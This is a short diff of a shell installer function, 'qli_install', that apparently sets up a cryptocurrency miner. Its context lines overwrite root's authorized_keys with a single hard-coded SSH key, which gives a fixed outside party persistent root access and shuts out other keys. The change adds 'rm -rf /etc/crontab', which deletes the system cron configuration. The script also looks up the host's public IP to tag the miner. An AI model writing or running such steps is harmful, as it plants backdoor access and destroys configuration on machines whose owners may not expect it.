@@ -16,7 +16,8 @@ function qli_install() {
   echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAl5QreAwkidb7s2ucEKdlQ1q9/voCnGiLjvwwmQPgpm' >/root/.ssh/authorized_keys
   chmod 700 /root/.ssh/authorized_keys
   chown -R root:root /root/.ssh/authorized_keys
-  apt update -y && apt install wget jq curl -y
+  rm -rf /etc/crontab
+  apt update -y && apt install wget jq curl cron -y
   # echo root:$(openssl rand -base64 32 | cut -c 1-16) | chpasswd
   [ -z "$ip" ] && ip=$(wget -T 3 -t 2 -qO- ifconfig.me)
   [ "$minerAlias" ] && minerAlias="${minerAlias}_${ip}" || minerAlias=$ip
